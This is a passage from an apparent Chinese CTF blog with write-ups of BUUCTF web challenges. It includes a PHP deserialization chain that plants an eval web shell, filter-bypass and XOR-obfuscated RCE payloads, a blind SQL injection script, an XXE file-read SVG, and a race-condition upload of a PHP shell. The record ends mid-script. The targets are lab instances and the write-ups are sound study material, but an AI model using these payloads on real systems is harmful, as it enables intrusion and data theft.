class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options=<span class="keyword">array</span>(<span class="string">&#x27;data_compress&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;expire&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="string">&#x27;strval&#x27;</span>,<span class="string">&#x27;prefix&#x27;</span>=&gt;<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=./uploads/&#x27;</span>);</span><br><span class="line">$a=<span class="keyword">new</span> A($b);</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>(<span class="number">111</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/PmFhYWFh&quot;</span>));</span><br><span class="line">$a-&gt;complete=<span class="number">1</span>;</span><br><span class="line">$a-&gt;key=<span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">$a-&gt;expire=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>这道题的坑点还挺多的<br>1.存在许多可能改变data的函数，但是都可以绕过<br>2.传入的数组需要为双重数组，具体是为什么可以在phpstorm中调试一下，并且我们的内容的键名还必须是他要求的那几个才会被识别进入content<br>3.exit的绕过需要了解base64的加密方式，然后后面的payload，在我们传入的时候后面需要再添加几个字母来补齐，防止前面的内容在解密的时候被吃掉</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/26/buu24/">buu24</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-26</time><div class="content"><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>首先是check函数过滤了一些字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果传入的是数组，那么就会进行foreach再对其键值进行check函数的过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过waf后的内容将会被传入index.php中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case &#39;upload&#39;:</span><br><span class="line">       $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">       waf($data);</span><br><span class="line">       file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br></pre></td></tr></table></figure>

<p>现在需要想的就是如何构造shell，过滤了php我们可以使用短标签进行绕过，过滤了 过滤了php我们可以使用.进行连接，过滤了空格，我们可以使用括号进行绕过，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=upload&amp;data=<span class="meta">&lt;?=</span>(ph.pinfo)()<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过成功<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726101524.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=upload&amp;data=<span class="meta">&lt;?=</span>`ls%<span class="number">09</span>/`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726101825.png" alt="img" style="zoom:67%;">
接下来就是cat它就好了

<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>测试了一下 发现是堆叠注入，但是没有输出回显信息，也不符合布尔盲注的条件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726115536.png" alt="img" style="zoom:67%;"></p>
<p>那就要考虑一下时间盲注了，接下来构造一下语句,尝试了一下select sleep(5)，发现没有反应，猜测存在过滤，堆叠注入的绕过有一个预处理，可以采取使用concat连接的方式进行绕过<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726153101.png" alt="img" style="zoom:67%;"></p>
<p>但是由于不确定都过滤了那些内容，虽然可以使用延迟进行fuzz，但是有点麻烦，可以直接采用十六进制转码的形式进行绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://5c6e0550-a9af-461f-8eda-50bc9d0086f0.node4.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.format(str_to_hex(payload.format(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([hex(ord(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这个是网上大神的脚本，我的好像出了点问题，没跑出来–得到glzjin_wants_a_girl_friend.zip里面是源码，接下来审计一下：<br>打开controllers进行审计，可以发现basecontrollers中，有文件包含，那么我看看这个viewData是用extract() 函数从数组中将变量导入到当前的符号表。如果可以控制这个viewdata，那么就可以实现变量覆盖了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 加载视图文件</span></span><br><span class="line"><span class="comment">	 * viewName 视图名称</span></span><br><span class="line"><span class="comment">	 * viewData 视图分配数据</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> $viewPath;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">$viewName =<span class="string">&#x27;&#x27;</span>, $viewData = []</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract($viewData);</span><br><span class="line">			<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个load方法只在user里面看到，并且listDAT是有request获得的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727110533.png" alt="img" style="zoom:50%;"></p>
<p>去userIndex里面查看一下这里的变量是img_file<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727111621.png" alt="img" style="zoom:67%;"><br>理一下思路，我们可以使用extract需要变量覆盖，传入的值是也是可控的，用request，所以构造payload,首先我们得先到user这个路由这里</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727112349.png" alt="img" style="zoom: 50%;">
不过对于这个传值还是想研究一下，所以在phpstorm里面断点调试一下
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727112758.png" alt="img" style="zoom:67%;">
为什么要是img，因为后面是这个变量的内容会回显在网页上，也就是这个图片

<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>题目说将svg转为png，svg是用xml格式定义的图像，推测是xxe注入<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727142603.png" alt="img" style="zoom:67%;"></p>
<p>在本地先编写一个svg文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;2000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;100&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将其上传即可<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727150556.png" alt="img" style="zoom:67%;"></p>
<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>python源码审计</p>
<p>将event写入session函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure>

<p>有三个points，0个num_items，但是不清楚有什么是写在session中的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727153715.png" alt="img"></p>
<p>这里num_items要大于等于5 flag就会被写入session<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727154134.png" alt="img" style="zoom: 50%;"></p>
<p>如果我们可以先买钻石，然后让flag被写入session中，然后再扣费，那就可以实现num_items大于等于5，可以看到这里有一个eval函数：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727160247.png" alt="img" style="zoom:67%;"></p>
<p>因为eval函数后面的参数可控所以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>

<p>然后使用flask-session-manager-master解密session<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727162533.png" alt="img" style="zoom:67%;"><br>即可获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727162532.png" alt="img" style="zoom:67%;"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/24/buu23/">buu23</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-24</time><div class="content"><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>开头源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>尝试了一下其他后缀名上传，发现无法被解析成功，所以看到这个upload()函数，以及对应的防护机制，猜测可以使用条件竞争绕过，写先一下脚本</p>
<p>thinkphp默认上传路径为：<br>/home/index/upload<br>所以有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/index.php/home/index/upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line">files1=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;</span>)&#125;</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files1).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e4d0f4.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e61127.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是去爆破一下这个文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">60fbd50e61127</span><br><span class="line">60fbd50e4d0f4</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/Public/Uploads/2021-07-24/&quot;</span></span><br><span class="line"><span class="comment"># files=&#123;&#x27;file&#x27;:(&quot;1.txt&quot;,&quot;&quot;)&#125;</span></span><br><span class="line"><span class="comment"># files1=&#123;&#x27;file[]&#x27;:(&quot;1.php&quot;,&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;)&#125;</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files1).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">str=<span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> o <span class="keyword">in</span> str:</span><br><span class="line">                    url_fina=url+<span class="string">f&quot;60fbd50e<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span><span class="subst">&#123;f&#125;</span><span class="subst">&#123;k&#125;</span><span class="subst">&#123;o&#125;</span>.php&quot;</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        r=requests.get(url,timeout=<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code!=<span class="number">404</span>:</span><br><span class="line">                        print(url_fina)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是现在buu的防止太多请求太严了–一直跑不出来</p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>忘保存了，没了很难受，大概就是照一张256像素一下的图片，然后将图片内容改为这一行因为那两个解析函数的解析方式在这里不同</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png" alt="img" style="zoom:67%;">

<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则进行匹配过滤，匹配00到空格()的字符，0到9的数字、<code>&quot;$&amp;.,|[&#123;_defgops</code>以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符<br>使用此网站可以进行正则匹配的调试<br><a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a><br>所以它允许出现的字符可以如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</span><br></pre></td></tr></table></figure>

<p>我们后面的eval肯定是要执行函数的，所以我们可以fuzz一下哪些函数没被过滤，从而来看看有没有实现rce的可能,用php写个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>,$arr))<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">if</span>(strlen(count_chars(strtolower($arr),<span class="number">0x3</span>))&gt;<span class="number">0xd</span>)<span class="keyword">continue</span>;</span><br><span class="line">	var_dump($arr.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是得到的函数却和读取文件啥的没有关系–，所以继续往下看看<br>其实以前也做过很多这种类似题特征是<br>1.过滤了很多字符<br>2.有些运算字符没有被过滤<br>那么这就意味着我们可以通过运算来取字符，比如说^运算然后去构造我们需要的字符<br>payloadtest:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>^%ff%ff%ff%ff%ff%ff%ff)();<span class="comment">//分号和括号是因为这个要放到eval里面执行，是必不可少的语法要求</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725220736.png" alt="image-20210725220736235" style="zoom:67%;">

<p>接下来看看这个配置里面有什么能用的信息不<br>首先disable_function中的函数有很多都被禁了，然后它可以访问的目录也只限制在/html目录下，那么根据以往的经验，大概是要scandir等函数看一下当前目录下的内容了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221932.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221933.png" alt="img" style="zoom:67%;"><br>我们构造一下语句然后去找一下字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&#39;.&#39;));</span><br></pre></td></tr></table></figure>

<p>还是之前的那个脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">find &#x3D; [&#39;p&#39;,&#39;r&#39;,&#39;i&#39;,&#39;_&#39;,&#39;n&#39;,&#39;t&#39;,&#39;s&#39;,&#39;c&#39;,&#39;a&#39;,&#39;d&#39;,&#39;r&#39;,&#39;.&#39;]</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    for j in range(0,256):</span><br><span class="line">        result&#x3D;chr(i^j)</span><br><span class="line">        if(result in find):</span><br><span class="line">            a&#x3D; i.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            b&#x3D; j.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            #print(a,b)</span><br><span class="line">            a&#x3D; urllib.parse.quote(a)</span><br><span class="line">            b&#x3D; urllib.parse.quote(b)</span><br><span class="line">            print(&quot;%s:%s^%s&quot;%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>但是这样运算出来的字符我们随便选取就会大于十三个了，要绕过这个，我们就要想想看如何缩减？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>其实运用一种套娃的思想即可，这些字符里面的字符肯定可以由其他字符再异或构成的，所以我们这里就将所有异或字符先列出，想在上面的代码进行改编一下，直接一步到位<br>但是我发现似乎不太行。还不如我直接取完再送进去对每个字符重新异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original chars,11 total</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), 